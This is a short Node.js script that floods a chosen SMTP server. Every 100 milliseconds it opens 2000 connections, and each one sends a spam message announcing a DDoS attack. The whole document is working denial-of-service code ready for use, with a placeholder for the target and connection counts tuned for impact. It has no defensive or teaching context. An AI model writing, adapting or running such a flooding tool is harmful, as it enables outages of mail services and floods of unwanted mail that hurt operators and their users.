const net = require('net');

const target = 'smtp.example.com'; // Replace with target SMTP server
const port = 25; // SMTP port
const connections = 2000; // Increased simultaneous connections
const timeout = 10000; // Connection timeout in ms

function smtpFlood() {
    for (let i = 0; i < connections; i++) {
        const socket = net.createConnection(port, target, () => {
            console.log(`[Connection ${i}] SMTP flood to ${target}:${port}`);
            socket.write('EHLO attacker.com\r\n');
            socket.write('MAIL FROM:<attacker@attacker.com>\r\n');
            socket.write('RCPT TO:<victim@victim.com>\r\n');
            socket.write('DATA\r\n');
            socket.write('Subject: DDoS Attack\r\n\r\nThis is a DDoS attack!\r\n.\r\n');
            socket.end();
        });

        socket.on('error', (e) => {
            console.error(`[Connection ${i}] Error: ${e.message}`);
        });

        socket.setTimeout(timeout, () => {
            console.log(`[Connection ${i}] Timeout after ${timeout / 1000} seconds`);
            socket.destroy();
        });
    }
}

setInterval(smtpFlood, 100); // Flood SMTP server every 100ms